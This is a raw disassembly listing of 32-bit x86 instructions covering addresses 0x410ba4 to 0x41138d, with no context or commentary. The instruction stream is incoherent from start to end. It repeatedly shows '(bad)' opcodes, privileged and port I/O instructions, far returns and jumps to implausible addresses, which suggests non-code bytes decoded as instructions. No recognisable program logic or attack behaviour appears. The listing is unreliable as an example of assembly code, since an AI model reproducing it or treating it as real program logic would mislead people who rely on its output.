  410ba4:	mov    eax,DWORD PTR [eax]
  410ba6:	hlt    
  410ba7:	add    al,al
  410ba9:	mov    eax,DWORD PTR ds:0x890045a8
  410baf:	dec    DWORD PTR [ebx+0x45fdf0e8]
  410bb5:	inc    DWORD PTR [eax*2+0xf75854d]
  410bbc:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  410bc2:	call   0x72976903
  410bc7:	je     0x410c27
  410bc9:	js     0x410c2a
  410bcb:	lock ret 0x7e
  410bcf:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  410bd5:	mov    edi,edi
  410bd7:	sbb    al,bl
  410bd9:	clc    
  410bda:	add    BYTE PTR [ebp-0x73],bh
  410bdd:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  410be3:	ror    BYTE PTR [eax],1
  410be5:	dec    ebp
  410be6:	xchg   ebp,eax
  410be7:	mov    edi,edi
  410be9:	in     al,0x8b
  410beb:	jge    0x410b76
  410bed:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  410bf3:	clc    
  410bf4:	pop    esi
  410bf5:	fist   DWORD PTR [ebp+0x5d398b5d]
  410bfb:	clc    
  410bfc:	add    al,0x6e
  410bfe:	mov    eax,DWORD PTR [ebx]
  410c00:	mov    BYTE PTR [ebp+0x0],dl
  410c03:	mov    edx,DWORD PTR [ebx-0x20]
  410c06:	adc    esi,DWORD PTR [edi+0x5e005f40]
  410c0c:	add    eax,0x3b3b73
  410c11:	adc    al,0x89
  410c13:	pop    eax
  410c14:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  410c18:	ret    0xf08
  410c1b:	cmp    al,0x2
  410c1d:	mov    DWORD PTR [edx+0x665500fc],edi
  410c23:	add    eax,ebx
  410c25:	add    esp,eax
  410c27:	sub    eax,eax
  410c29:	or     BYTE PTR [ecx-0x77f474bb],cl
  410c2f:	add    BYTE PTR [eax],al
  410c31:	mov    DWORD PTR [ebx-0x24],ebx
  410c34:	push   edi
  410c35:	push   ebp
  410c36:	clc    
  410c37:	add    DWORD PTR [esi+0x1b0100],0x45
  410c3e:	out    0xff,eax
  410c40:	add    edx,DWORD PTR [eax]
  410c42:	jmp    0x410c2c
  410c44:	cmp    ch,0x48
  410c47:	(bad)  
  410c48:	jmp    0x40c6949a
  410c4d:	je     0x410bd9
  410c4f:	mov    eax,DWORD PTR [eax-0x10c78104]
  410c55:	inc    ebp
  410c56:	add    BYTE PTR [ebx-0x770375],al
  410c5c:	add    ah,ch
  410c5e:	add    edx,esp
  410c60:	pop    edi
  410c61:	pop    ebp
  410c62:	push   ebp
  410c63:	inc    ebx
  410c64:	in     al,dx
  410c65:	pop    ebp
  410c66:	in     al,dx
  410c67:	cmp    edx,DWORD PTR [edi-0x8]
  410c6a:	xor    eax,0x895b9c94
  410c6f:	leave  
  410c70:	call   0x89965379
  410c75:	in     al,dx
  410c76:	in     al,0x45
  410c78:	dec    ebp
  410c79:	push   esi
  410c7a:	test   DWORD PTR [eax+0xfb010f],esi
  410c80:	add    BYTE PTR [eax+0xc018b],dh
  410c86:	leave  
  410c87:	inc    ebp
  410c88:	test   al,ch
  410c8a:	add    dh,bh
  410c8c:	add    bh,bh
  410c8e:	dec    ebp
  410c8f:	push   cs
  410c90:	mov    DWORD PTR [ecx],eax
  410c92:	hlt    
  410c93:	push   es
  410c94:	dec    ebp
  410c95:	leave  
  410c96:	mov    DWORD PTR [eax],ecx
  410c98:	clc    
  410c99:	cmovge eax,ecx
  410c9c:	mov    ecx,0x85c2f0
  410ca2:	clc    
  410ca3:	pop    DWORD PTR [ebp+0x1]
  410ca6:	push   ebx
  410ca7:	add    BYTE PTR [ebp-0x15],bh
  410caa:	push   esi
  410cab:	xor    eax,0x898a45
  410cb0:	cld    
  410cb1:	push   es
  410cb2:	inc    ebp
  410cb3:	add    BYTE PTR [ebx],dh
  410cb5:	pushfw 
  410cb7:	add    DWORD PTR [esi+0x78308c1],edi
  410cbd:	add    ah,BYTE PTR [ebx-0x49]
  410cc0:	int    0xbb
  410cc2:	mov    ecx,DWORD PTR [esi+0xc]
  410cc5:	add    dh,al
  410cc7:	cmp    ecx,ebx
  410cc9:	jne    0x410c93
  410ccb:	xor    ecx,DWORD PTR [ebp+0x66]
  410cce:	jmp    0xc80cd4
  410cd3:	add    DWORD PTR [ebp+0x0],eax
  410cd6:	mov    eax,ebx
  410cd8:	or     al,0x8b
  410cda:	(bad)  
  410cdb:	mov    ecx,esi
  410cdd:	mov    BYTE PTR [eax+eax*1+0x664c13a],cl
  410ce4:	mov    eax,edi
  410ce6:	or     BYTE PTR [edx],cl
  410ce8:	shl    cl,cl
  410cea:	icebp  
  410ceb:	add    BYTE PTR [ebp+0x36],0x8b
  410cef:	or     BYTE PTR [edx+eax*2],cl
  410cf2:	(bad)  
  410cf3:	or     cl,dh
  410cf5:	stc    
  410cf6:	shl    DWORD PTR [ebp-0x30],0xc6
  410cfa:	xor    al,0x0
  410cfc:	inc    ebp
  410cfd:	xchg   BYTE PTR [ebx],al
  410cff:	add    esp,edi
  410d01:	add    BYTE PTR [ebp-0x39],cl
  410d04:	mov    al,bl
  410d06:	test   DWORD PTR [ebx+0x1c348375],ecx
  410d0c:	sub    al,0xbf
  410d0e:	jmp    0x410c95
  410d10:	mov    edi,eax
  410d12:	lock jge 0x410d06
  410d15:	lea    esi,[edx-0x74bad503]
  410d1b:	mov    ebp,esp
  410d1d:	or     cl,dh
  410d1f:	leave  
  410d20:	add    al,BYTE PTR [eax+eax*4-0x37ff9d00]
  410d27:	dec    ebp
  410d28:	dec    ebp
  410d29:	test   DWORD PTR [ebx],eax
  410d2b:	paddb  mm6,mm0
  410d2e:	add    DWORD PTR [eax],eax
  410d30:	dec    ebp
  410d31:	mov    ecx,DWORD PTR [ebx-0x62b217f0]
  410d37:	mov    esi,DWORD PTR [edx]
  410d39:	or     al,0x2b
  410d3b:	dec    ebp
  410d3c:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  410d42:	mov    esp,ebp
  410d44:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  410d4b:	mov    DWORD PTR [ebx],ebp
  410d4d:	call   0xc74967d
  410d52:	mov    DWORD PTR [ebp+0x10],ecx
  410d55:	(bad)  
  410d56:	push   0x8b85ff10
  410d5b:	clc    
  410d5c:	or     al,0x56
  410d5e:	(bad)  
  410d5f:	push   ecx
  410d60:	retf   
  410d61:	mov    ebx,0xff4d8dc8
  410d66:	mov    DWORD PTR [ebp+0x8],eax
  410d69:	xor    eax,DWORD PTR [ebp-0x75]
  410d6c:	cmp    ebp,DWORD PTR [ebx]
  410d6e:	lsl    ebx,WORD PTR [edi-0x8]
  410d72:	call   DWORD PTR [ebx-0x741bff75]
  410d78:	(bad)  
  410d79:	or     al,0x5b
  410d7b:	dec    ebp
  410d7c:	or     BYTE PTR [ebx],dh
  410d7e:	inc    ebp
  410d7f:	xor    esi,DWORD PTR ds:0x708088d
  410d85:	in     eax,0x9d
  410d87:	add    BYTE PTR [edx],dh
  410d89:	inc    ebp
  410d8a:	pop    edi
  410d8b:	xor    eax,edx
  410d8d:	test   DWORD PTR [eax],0x83108b8b
  410d93:	dec    ebp
  410d94:	adc    al,0x33
  410d96:	inc    ebp
  410d97:	xor    esi,DWORD PTR ds:0xc73b9c2b
  410d9d:	jne    0x410d9b
  410d9f:	mov    eax,DWORD PTR [ebp+0x345f808]
  410da5:	mov    eax,DWORD PTR [ebp-0xc]
  410da8:	mov    DWORD PTR [eax],0x685c9f4
  410dae:	clc    
  410daf:	dec    eax
  410db0:	push   edi
  410db1:	ss inc ebp
  410db3:	pop    ss
  410db4:	aad    0x4d
  410db6:	xlat   BYTE PTR ds:[ebx]
  410db7:	or     BYTE PTR [ebx+0x4d63fc56],0xd1
  410dbe:	mov    eax,0x780084d
  410dc3:	push   esi
  410dc4:	clc    
  410dc5:	ret    0xe99d
  410dc8:	xor    dl,dl
  410dca:	xor    ecx,DWORD PTR [ebx+0x4d030803]
  410dd0:	js     0x88799cf
  410dd6:	dec    ebp
  410dd7:	push   ebp
  410dd8:	mov    edi,DWORD PTR [eax+0xc872fc]
  410dde:	lock enter 0xceca,0xf2
  410de3:	retf   0x18ce
  410de6:	jne    0x410e35
  410de8:	mov    ecx,DWORD PTR [ebx-0x31eaf304]
  410dee:	enter  0xf0d6,0xca
  410df2:	retf   0xf2c8
  410df5:	into   
  410df6:	out    dx,al
  410df7:	dec    ebp
  410df8:	dec    ebp
  410df9:	jmp    0xff450d31
  410dfe:	xor    eax,DWORD PTR [ebp-0x15]
  410e01:	xor    esi,DWORD PTR [ebx]
  410e03:	mov    esi,DWORD PTR [ebx]
  410e05:	sub    eax,DWORD PTR [ebx]
  410e07:	add    eax,DWORD PTR [ebx]
  410e09:	or     bl,dl
  410e0b:	dec    ebp
  410e0c:	mov    DWORD PTR [ebx-0x38b2ef08],ecx
  410e12:	xor    eax,DWORD PTR [ebp-0xf00073]
  410e18:	jb     0x410e5f
  410e1a:	add    BYTE PTR [ebx],dh
  410e1c:	dec    ebp
  410e1d:	pop    esi
  410e1e:	mov    ebp,ebx
  410e20:	cld    
  410e21:	mov    esi,eax
  410e23:	call   0x520f64f0
  410e28:	stc    
  410e29:	add    eax,0x4572aa
  410e2e:	pop    edi
  410e2f:	leave  
  410e30:	add    ecx,DWORD PTR [eax*2-0x3c13a1ab]
  410e37:	in     al,dx
  410e38:	mov    eax,edi
  410e3a:	xor    eax,0xf8008520
  410e40:	mov    DWORD PTR [ebp-0x14],0xf89c8532
  410e47:	mov    eax,DWORD PTR [ebp-0x77]
  410e4a:	xor    bh,al
  410e4c:	pushf  
  410e4d:	inc    ebp
  410e4e:	(bad)  
  410e4f:	cmp    eax,0x56869ce8
  410e54:	clc    
  410e55:	mov    edi,0x8518e4ec
  410e5b:	jmp    0xf056:0x8b457df8
  410e62:	push   esi
  410e63:	push   esi
  410e64:	push   ecx
  410e65:	push   ecx
  410e66:	push   edi
  410e67:	xor    eax,esi
  410e69:	mov    edx,0x32729d
  410e6e:	add    ecx,eax
  410e70:	mov    edx,edi
  410e72:	clc    
  410e73:	retf   0xaf45
  410e76:	cmp    eax,0xc78b9ceb
  410e7b:	clc    
  410e7c:	cld    
  410e7d:	jne    0x410e97
  410e7f:	xor    ebp,edx
  410e81:	xor    eax,DWORD PTR [ebp+0x3]
  410e84:	or     BYTE PTR [ebx],al
  410e86:	add    BYTE PTR [ebp-0x7747475],al
  410e8c:	hlt    
  410e8d:	dec    ebp
  410e8e:	dec    ebp
  410e8f:	je     0x410ec4
  410e91:	xor    esi,DWORD PTR [ebx]
  410e93:	xor    eax,DWORD PTR [ebx]
  410e95:	add    eax,DWORD PTR [ebx]
  410e97:	add    ecx,DWORD PTR [edi]
  410e99:	rol    ecx,cl
  410e9b:	mov    esi,DWORD PTR [ecx]
  410e9d:	in     al,dx
  410e9e:	inc    ebp
  410e9f:	enter  0xca2b,0x33
  410ea3:	icebp  
  410ea4:	mov    DWORD PTR [edx],ecx
  410ea6:	clc    
  410ea7:	lock pop ebp
  410ea9:	enter  0xf2e8,0xfe
  410ead:	retf   0xeeff
  410eb0:	inc    ebp
  410eb1:	jne    0x410e3e
  410eb3:	mov    edi,eax
  410eb5:	cld    
  410eb6:	dec    ebp
  410eb7:	enter  0xbc89,0x8d
  410ebb:	popf   
  410ebc:	sti    
  410ebd:	xor    bh,bh
  410ebf:	mov    eax,DWORD PTR [ebp-0xc]
  410ec2:	mov    esi,DWORD PTR [ebp-0x4]
  410ec5:	xor    eax,esi
  410ec7:	xor    eax,DWORD PTR [ebx+ebp*1+0x76323b9d]
  410ece:	mov    DWORD PTR [ebx-0x76ba0704],ecx
  410ed4:	mov    ecx,DWORD PTR [ebx-0x3631070c]
  410eda:	(bad)  
  410edb:	push   ebp
  410edc:	shr    esp,0x4d
  410edf:	in     al,dx
  410ee0:	cmp    eax,DWORD PTR [esi+esi*2]
  410ee3:	add    BYTE PTR [ebx-0x39ca1bbb],cl
  410ee9:	pushf  
  410eea:	mov    edi,0x85c7f445
  410ef0:	call   0xf88695ed
  410ef5:	xor    eax,0x53619cdb
  410efa:	dec    ebp
  410efb:	inc    ebp
  410efc:	mov    esi,DWORD PTR [eax+edi*8]
  410eff:	pushf  
  410f00:	into   
  410f01:	mov    ecx,edi
  410f03:	in     al,dx
  410f04:	call   0x8b4954c7
  410f09:	pop    es
  410f0a:	or     BYTE PTR [ebx],dh
  410f0c:	or     BYTE PTR [edi+0x8a724d],bh
  410f12:	or     eax,edi
  410f14:	push   ebp
  410f15:	inc    ebp
  410f16:	cmpxchg8b (bad)
  410f17:	(bad)  
  410f18:	leave  
  410f19:	loopne 0x410ee5
  410f1b:	test   DWORD PTR [ebp-0x8],ecx
  410f1e:	mov    eax,DWORD PTR [ebp-0x18]
  410f21:	aad    0x55
  410f23:	xlat   BYTE PTR ds:[ebx]
  410f24:	xor    eax,edi
  410f26:	add    esi,eax
  410f28:	and    eax,DWORD PTR [eax]
  410f2a:	mov    eax,DWORD PTR [eax]
  410f2c:	(bad)  
  410f2d:	leave  
  410f2e:	sti    
  410f2f:	inc    ebp
  410f30:	dec    DWORD PTR [ebx-0x39cc13ab]
  410f36:	mov    esi,ecx
  410f38:	clc    
  410f39:	(bad)  
  410f3a:	dec    ebp
  410f3b:	iret   
  410f3c:	xor    ebp,DWORD PTR [edi-0x74f71473]
  410f42:	jb     0x410f40
  410f44:	add    bh,al
  410f46:	inc    ebp
  410f47:	(bad)  
  410f48:	mov    eax,DWORD PTR [ebp-0xc]
  410f4b:	(bad)  
  410f4c:	xabort 0x63
  410f4f:	loopne 0x410f1e
  410f51:	jmp    FWORD PTR [ebx]
  410f53:	mov    DWORD PTR [ebx],eax
  410f55:	clc    
  410f56:	lock inc ebp
  410f58:	dec    ebp
  410f59:	mov    ecx,DWORD PTR [ebx+0x4d84ecfc]
  410f5f:	loopne 0x410f94
  410f61:	inc    DWORD PTR [ebx]
  410f63:	mov    edi,DWORD PTR [ebx]
  410f65:	hlt    
  410f66:	jne    0x410fb5
  410f68:	mov    esi,DWORD PTR [ebx]
  410f6a:	in     al,0x8d
  410f6c:	dec    ebp
  410f6d:	or     BYTE PTR [ebx],dh
  410f6f:	jb     0x410f74
  410f71:	add    BYTE PTR [edi+0x45],bl
  410f74:	xor    ecx,DWORD PTR [ebx+0x4dc2e85b]
  410f7a:	add    BYTE PTR [ebx],dh
  410f7c:	mov    esi,DWORD PTR [ebx]
  410f7e:	mov    ebp,DWORD PTR [ebx]
  410f80:	sbb    BYTE PTR [ebx-0x377403b3],cl
  410f86:	nop
  410f87:	mov    ecx,0x338b4500
  410f8c:	add    DWORD PTR [ebx],0x70
  410f8f:	mov    DWORD PTR [esi-0x8],edx
  410f92:	jne    0x410fd9
  410f94:	mov    esi,DWORD PTR [edi+edx*2]
  410f97:	pushf  
  410f98:	push   esi
  410f99:	mov    edx,DWORD PTR [ecx-0x15]
  410f9c:	xor    ecx,DWORD PTR [ebx+0x4572e0bb]
  410fa2:	add    BYTE PTR [ebx],dh
  410fa4:	retf   
  410fa5:	add    edx,ecx
  410fa7:	ror    DWORD PTR [edi],cl
  410fa9:	mov    DWORD PTR ds:0x7f452dfc,ebp
  410faf:	mov    ch,dl
  410fb1:	mov    BYTE PTR [eax+0xb],dh
  410fb4:	fimul  WORD PTR [ebp+0x0]
  410fb7:	mov    ecx,DWORD PTR [ebx+0x55b608f8]
  410fbd:	xor    esi,DWORD PTR [ebx]
  410fbf:	mov    DWORD PTR [ebx],esi
  410fc1:	or     BYTE PTR [ebx],al
  410fc3:	dec    ebp
  410fc4:	add    ecx,DWORD PTR [ebx-0x318af7c5]
  410fca:	or     edi,0x8c64ca9c
  410fd0:	out    dx,eax
  410fd1:	loopne 0x410fe8
  410fd3:	(bad)  
  410fd4:	jmp    0x13d1464
  410fd9:	retf   0x4d4d
  410fdc:	xor    ecx,DWORD PTR [ebx-0x31c40bfd]
  410fe2:	je     0x3241ad8c
  410fe8:	mov    ecx,DWORD PTR [ecx+0x45450818]
  410fee:	mov    DWORD PTR [ebx],esi
  410ff0:	sbb    BYTE PTR [ecx-0x7472b3],bh
  410ff6:	mov    eax,ecx
  410ff8:	fmul   DWORD PTR [ebp+0x45]
  410ffb:	mov    DWORD PTR ds:0xba459cf0,esi
  411001:	mov    eax,DWORD PTR [ebp+0x55c6f8f0]
  411007:	(bad)  
  411008:	mov    ecx,eax
  41100a:	sbb    BYTE PTR [ecx-0x7474babb],dl
  411010:	sbb    al,bh
  411012:	add    dh,0x1
  411015:	mov    DWORD PTR [eax],0x4dc1005e
  41101b:	leave  
  41101c:	mov    eax,DWORD PTR [eax+ebx*1]
  41101f:	push   ebp
  411020:	mov    esp,ebp
  411022:	add    DWORD PTR [ebp+0x0],eax
  411025:	mov    ecx,DWORD PTR [ecx]
  411027:	or     BYTE PTR [eax-0x80],cl
  41102a:	mov    DWORD PTR [ecx],eax
  41102c:	or     al,0x0
  41102e:	inc    ebp
  41102f:	add    BYTE PTR [ebx],dh
  411031:	in     al,dx
  411032:	add    edx,DWORD PTR [ebx-0x77]
  411035:	mov    esi,esp
  411037:	adc    BYTE PTR [ebp+0x16],al
  41103a:	xor    edi,DWORD PTR [edi+0x7890803]
  411040:	adc    al,0xcf
  411042:	inc    ebp
  411043:	popf   
  411044:	mov    esi,DWORD PTR [edx]
  411046:	push   eax
  411047:	add    ebp,eax
  411049:	cmp    ecx,DWORD PTR [ecx+0x4581d075]
  41104f:	pushf  
  411050:	mov    esp,DWORD PTR [eax+edi*1+0x44]
  411054:	dec    ebp
  411055:	fwait
  411056:	dec    eax
  411057:	jmp    0xcc149d
  41105c:	or     al,0x4d
  41105e:	sbb    BYTE PTR [ebx-0x3074f3c0],cl
  411064:	or     al,0xd7
  411066:	dec    ecx
  411067:	retf   
  411068:	dec    eax
  411069:	rcl    eax,cl
  41106b:	retf   0xfc8
  41106e:	inc    ebp
  41106f:	or     eax,0x7f382d8b
  411074:	sar    esp,0x3
  411077:	lahf   
  411078:	inc    eax
  411079:	mov    ebp,0x8b180089
  41107e:	inc    ebp
  41107f:	or     BYTE PTR [ebx],dh
  411081:	iret   
  411082:	add    ecx,ebx
  411084:	mov    ecx,eax
  411086:	adc    al,0x84
  411088:	inc    ebp
  411089:	add    al,0x33
  41108b:	add    BYTE PTR [ebx],al
  41108d:	dec    ebp
  41108e:	mov    DWORD PTR [ecx+0x4d45dc14],ecx
  411094:	mov    ecx,DWORD PTR [ebx+0x6c714d4]
  41109a:	ret    
  41109b:	inc    ebp
  41109c:	add    edi,eax
  41109e:	push   ebp
  41109f:	or     bh,al
  4110a1:	test   DWORD PTR [eax+edi*8],edx
  4110a4:	test   DWORD PTR [edx],esi
  4110a6:	clc    
  4110a7:	pushf  
  4110a8:	inc    ebp
  4110a9:	mov    DWORD PTR [eax],esi
  4110ab:	lock pushf 
  4110ad:	inc    ebp
  4110ae:	(bad)  
  4110af:	mov    DWORD PTR [eax+ebx*1],edx
  4110b2:	test   DWORD PTR [ebp-0x8],eax
  4110b5:	mov    eax,DWORD PTR [ebp-0x70]
  4110b8:	mov    eax,DWORD PTR [eax]
  4110ba:	sbb    BYTE PTR [ebx-0x2b3c7639],cl
  4110c0:	scas   eax,DWORD PTR es:[edi]
  4110c1:	dec    ebp
  4110c2:	mov    ecx,DWORD PTR [ebx+0x559008]
  4110c8:	xor    ecx,DWORD PTR [ebx+0x3c11038d]
  4110ce:	jb     0x41111d
  4110d0:	add    BYTE PTR [ebx-0x387cf73f],cl
  4110d6:	add    eax,ebx
  4110d8:	add    BYTE PTR [ebp+0x45],al
  4110db:	mov    esi,DWORD PTR [ebx]
  4110dd:	or     BYTE PTR [ebx],al
  4110df:	(bad)  
  4110e0:	mov    ebx,eax
  4110e2:	adc    al,0x45
  4110e4:	inc    ebp
  4110e5:	mov    eax,DWORD PTR [ebx]
  4110e7:	or     al,0xdc
  4110e9:	inc    eax
  4110ea:	inc    ebp
  4110eb:	cmp    edi,0xc
  4110ee:	hlt    
  4110ef:	inc    ebp
  4110f0:	jne    0x41107d
  4110f2:	mov    ecx,DWORD PTR [esp+ecx*1]
  4110f5:	inc    eax
  4110f6:	bound  ecx,QWORD PTR [ebx-0x7a76f301]
  4110fc:	clc    
  4110fd:	push   esp
  4110fe:	inc    ebp
  4110ff:	inc    ebp
  411100:	cmp    eax,0x8b8b9c74
  411105:	cmp    al,ah
  411107:	dec    ebp
  411108:	(bad)  
  411109:	mov    eax,ebx
  41110b:	push   esp
  41110c:	(bad)  
  41110d:	idiv   DWORD PTR [eax-0x87417dd]
  411113:	or     al,0xff
  411115:	inc    eax
  411116:	inc    ebp
  411117:	add    eax,DWORD PTR [ebp-0x74748b15]
  41111d:	push   esp
  41111e:	loopne 0x411165
  411120:	(bad)  
  411121:	mov    eax,ebx
  411123:	or     bh,bh
  411125:	xbegin 0x508656ee
  41112b:	mov    ebx,esp
  41112d:	or     bh,bh
  41112f:	(bad)  
  411130:	mov    eax,ebx
  411132:	hlt    
  411133:	inc    ebp
  411134:	inc    ebp
  411135:	mov    ecx,DWORD PTR [ebx+0x4d4de008]
  41113b:	xor    ebp,DWORD PTR [ebx]
  41113d:	add    ecx,DWORD PTR [ecx+0x4589e089]
  411143:	adc    al,0x8b
  411145:	inc    ebp
  411146:	clc    
  411147:	xor    eax,DWORD PTR [eax-0x64]
  41114a:	add    eax,edi
  41114c:	or     al,0x14
  41114e:	dec    ebp
  41114f:	test   DWORD PTR [ebx],edi
  411151:	clc    
  411152:	jb     0x411199
  411154:	mov    esi,DWORD PTR [ecx]
  411156:	clc    
  411157:	pushf  
  411158:	inc    eax
  411159:	mov    ecx,DWORD PTR [ebx+0x414df8f0]
  41115f:	xor    ecx,DWORD PTR [ebx-0x3ef01ffd]
  411165:	shr    esi,0x4d
  411168:	add    BYTE PTR [ebx-0x30002f96],cl
  41116e:	hlt    
  41116f:	mov    WORD PTR [ebp-0x63],es
  411172:	push   eax
  411173:	xor    dl,BYTE PTR [ebx+edi*1-0x5347f001]
  41117a:	test   DWORD PTR [eax],eax
  41117c:	clc    
  41117d:	mov    eax,DWORD PTR [ebp+0x8]
  411180:	mov    edi,0x4585c3c8
  411186:	clc    
  411187:	mov    eax,DWORD PTR [ebp+0x18]
  41118a:	xor    eax,DWORD PTR [ebp-0x64]
  41118d:	mov    edi,eax
  41118f:	hlt    
  411190:	shl    BYTE PTR [ebp-0x7b],0x8b
  411194:	clc    
  411195:	fmul   QWORD PTR [ebp+0x4d]
  411198:	mov    eax,ebp
  41119a:	in     al,dx
  41119b:	icebp  
  41119c:	dec    ebp
  41119d:	dec    DWORD PTR [ecx+0x4dc7e845]
  4111a3:	loopne 0x41112e
  4111a5:	test   eax,edi
  4111a7:	clc    
  4111a8:	dec    ebp
  4111a9:	inc    ebp
  4111aa:	mov    DWORD PTR [ebx],esi
  4111ac:	in     al,0x3
  4111ae:	dec    ebp
  4111af:	push   eax
  4111b0:	xor    eax,DWORD PTR [ebp+0x3]
  4111b3:	push   eax
  4111b4:	mov    DWORD PTR [eax-0x20],edx
  4111b7:	push   edi
  4111b9:	mov    eax,DWORD PTR [eax]
  4111bb:	clc    
  4111bc:	cmp    eax,0xf84e85c0
  4111c1:	inc    ebp
  4111c2:	test   BYTE PTR [ebx],dh
  4111c4:	add    DWORD PTR [ebx],eax
  4111c6:	add    BYTE PTR [eax+0x4d],dl
  4111c9:	jne    0x4111fe
  4111cb:	lea    ecx,[ebx-0x7617fc48]
  4111d1:	cmc    
  4111d2:	adc    al,0xff
  4111d4:	inc    ebp
  4111d5:	inc    ebp
  4111d6:	xor    ecx,DWORD PTR [ecx+0x4530e08d]
  4111dc:	jb     0x411169
  4111de:	add    ah,bl
  4111e0:	inc    ebp
  4111e1:	ror    DWORD PTR [ebx+0x4d8bf045],0xf8
  4111e8:	xor    ecx,DWORD PTR [ebp+0x3]
  4111eb:	mov    edi,DWORD PTR [ebx]
  4111ed:	adc    BYTE PTR [ebp+0x41],dh
  4111f0:	mov    ecx,DWORD PTR [ebx-0x37381ff8]
  4111f6:	ret    
  4111f7:	push   ss
  4111f8:	push   0x45
  4111fa:	lea    ecx,[ebx+0x4de80cac]
  411200:	cli    
  411201:	add    edi,edi
  411203:	or     BYTE PTR [ebp+0x4d],al
  411206:	mov    ebp,DWORD PTR [ebx]
  411208:	xor    ebp,ecx
  41120a:	mov    al,BYTE PTR [edx]
  41120c:	add    eax,0xc7200
  411211:	jne    0x411260
  411213:	lea    esi,[ebx]
  411215:	lods   al,BYTE PTR ds:[esi]
  411216:	psubsb mm0,mm0
  411219:	cmc    
  41121a:	retf   
  41121b:	inc    ecx
  41121d:	xor    eax,0x89019c84
  411222:	add    ah,cl
  411224:	inc    ebp
  411225:	inc    ebp
  411226:	mov    esi,DWORD PTR [edx]
  411228:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c405c7]
  41122f:	test   DWORD PTR [eax],eax
  411231:	clc    
  411232:	dec    ebp
  411233:	inc    ebp
  411234:	xor    esi,DWORD PTR [eax]
  411236:	setl   al
  411239:	(bad)  
  41123a:	retf   
  41123b:	int3   
  41123c:	ror    DWORD PTR [ebp-0x7c],0x8d
  411240:	add    eax,ecx
  411242:	add    BYTE PTR [ebp+0x45],cl
  411245:	lea    ecx,[ebx-0x75b2cc3c]
  41124b:	lea    eax,ds:0x4d72c0
  411251:	mov    ecx,DWORD PTR [ebp+0x8]
  411254:	xor    ecx,edi
  411256:	bswap  ebx
  411258:	ror    BYTE PTR [ebp-0x35],0xe9
  41125c:	rol    DWORD PTR [ecx],0x84
  41125f:	add    BYTE PTR [ecx],al
  411261:	xor    eax,DWORD PTR [eax]
  411263:	pushf  
  411264:	inc    ebp
  411265:	jnp    0x8a414669
  41126b:	mov    eax,DWORD PTR ds:0xcf72f0
  411271:	lock dec ebp
  411273:	retf   
  411274:	xor    ecx,DWORD PTR [ebp+0xf]
  411277:	mov    eax,eax
  411279:	loopne 0x411246
  41127b:	test   ecx,0x19d8484
  411281:	xor    al,BYTE PTR [eax]
  411283:	mov    DWORD PTR [ebp-0x20],eax
  411286:	mov    eax,DWORD PTR [ebp+0x33]
  411289:	mov    ecx,DWORD PTR [edx+0x72c705e0]
  41128f:	ret    
  411290:	add    al,cl
  411292:	dec    ebp
  411293:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  411299:	add    ecx,DWORD PTR ds:0xc7250
  41129f:	inc    ebp
  4112a0:	rcl    DWORD PTR [eax+0x4d],0x5f
  4112a4:	mov    edi,edi
  4112a6:	xor    ecx,DWORD PTR [ebx+0xdec8a]
  4112ac:	jb     0x411275
  4112ae:	add    BYTE PTR [ecx+eax*8-0x74cdb2b7],al
  4112b5:	mov    esi,DWORD PTR [ebx]
  4112b7:	or     BYTE PTR [edx+0x72b60dcf],cl
  4112bd:	add    eax,DWORD PTR [eax]
  4112bf:	cmp    ecx,eax
  4112c1:	jne    0x41133f
  4112c7:	mov    eax,DWORD PTR [ebp-0x18]
  4112ca:	mov    eax,DWORD PTR [eax]
  4112cc:	xor    eax,edi
  4112ce:	mov    al,BYTE PTR [ebp+eax*1+0x327249]
  4112d5:	mov    ecx,DWORD PTR [ebp+0x8]
  4112d8:	mov    ecx,edi
  4112da:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  4112e0:	jb     0x4112f1
  4112e2:	add    BYTE PTR [eax-0x3f],bl
  4112e5:	add    BYTE PTR [ebp-0x75],cl
  4112e8:	mov    edi,eax
  4112ea:	xor    eax,DWORD PTR [eax]
  4112ec:	mov    al,bh
  4112ee:	or     eax,0x497284
  4112f3:	xor    al,cl
  4112f5:	mov    ecx,DWORD PTR [ebp+0x8]
  4112f8:	mov    ecx,edi
  4112fa:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  411300:	jb     0x411311
  411302:	add    BYTE PTR [eax],bh
  411304:	enter  0x8500,0x8b
  411308:	add    ah,ah
  41130a:	add    BYTE PTR [eax],al
  41130c:	inc    ebp
  41130d:	(bad)  
  41130e:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a49]
  411315:	mov    esi,DWORD PTR [edx+0x8]
  411318:	add    bh,cl
  41131a:	dec    ebp
  41131b:	mov    dh,0x8b
  41131d:	add    esi,DWORD PTR [ebx]
  41131f:	cmp    ecx,DWORD PTR [edx+0x72180d0f]
  411325:	add    BYTE PTR [eax],al
  411327:	mov    eax,ecx
  411329:	call   0xc7cc137b
  41132e:	xor    eax,DWORD PTR [edx+ecx*4+0x72320d49]
  411335:	mov    eax,DWORD PTR [eax]
  411337:	in     al,dx
  411338:	ror    DWORD PTR [ecx],0x4d
  41133b:	iret   
  41133c:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a49]
  411343:	xor    dh,BYTE PTR [edx-0x75]
  411346:	add    al,bh
  411348:	enter  0x5009,0xcf
  41134c:	inc    ebp
  41134d:	mov    WORD PTR [ebx-0x75cdccb7],cs
  411353:	or     al,BYTE PTR ds:0xec728b
  411359:	or     DWORD PTR [ebp-0x31],ecx
  41135c:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4d]
  411363:	cmp    dh,BYTE PTR [edx+0xf]
  411366:	add    ah,dl
  411368:	rol    DWORD PTR [eax],0x4d
  41136b:	mov    ecx,DWORD PTR [ebx-0x75ffcc08]
  411371:	(bad)  
  411372:	or     eax,0x497284
  411377:	xor    al,cl
  411379:	mov    ecx,DWORD PTR [ebp-0x18]
  41137c:	mov    ecx,DWORD PTR [ecx]
  41137e:	xor    ecx,edi
  411380:	mov    cl,BYTE PTR [ebp+ecx*1+0x327249]
  411387:	xor    cl,al
  411389:	mov    edx,DWORD PTR [eax]
  41138b:	in     al,0x45
  41138d:	or     DWORD PTR [eax-0x31],edx
